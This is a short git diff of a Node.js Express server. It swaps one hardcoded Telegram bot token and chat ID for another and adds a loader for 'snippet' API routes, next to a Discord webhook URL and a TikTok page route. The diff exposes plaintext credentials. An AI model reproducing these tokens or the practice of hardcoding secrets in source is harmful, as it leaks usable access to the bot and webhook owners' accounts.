@@ -19,8 +19,8 @@ const WEBHOOK_URL = 'https://discord.com/api/webhooks/1396122030163628112/-vEj4H
 // =========================
 // TELEGRAM NOTIFICATION
 // =========================
-const TELEGRAM_BOT_TOKEN = '8715828235:AAEPV8q2uPHUeOvg6w4hY67UkmRLSp-RWm0';
-const TELEGRAM_CHAT_ID = '8115232554';
+const TELEGRAM_BOT_TOKEN = '8364129852:AAEjCrqQBI7f1OpVkhnxOBhcww9yegoJ-EU';
+const TELEGRAM_CHAT_ID = '7019305587';
 
 // =========================
 // LOG BUFFER
@@ -190,6 +190,13 @@ app.get('/tiktok', (req, res) => {
     if (require('fs').existsSync(p)) res.sendFile(p);
     else res.status(404).send('TikTok page not found');
 });
+
+
+// =========================
+// SNIPPET API ROUTES (must be BEFORE static middleware)
+// =========================
+require('./src/api/snippet/routes.js')(app);
+console.log(chalk.green('  ✅ Loaded route: snippet/routes.js'));
 
 // =========================
 // STATIC FILES (after explicit routes)
